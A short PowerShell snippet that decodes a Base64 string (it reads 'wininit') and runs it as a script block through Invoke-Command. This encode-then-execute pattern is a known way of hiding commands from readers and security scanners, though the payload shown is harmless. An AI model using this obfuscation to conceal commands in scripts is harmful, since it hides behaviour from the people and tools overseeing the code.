$dbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2luaW5pdA=="))
$dab = [scriptblock]::Create($dbs)
Invoke-Command -ScriptBlock $dab
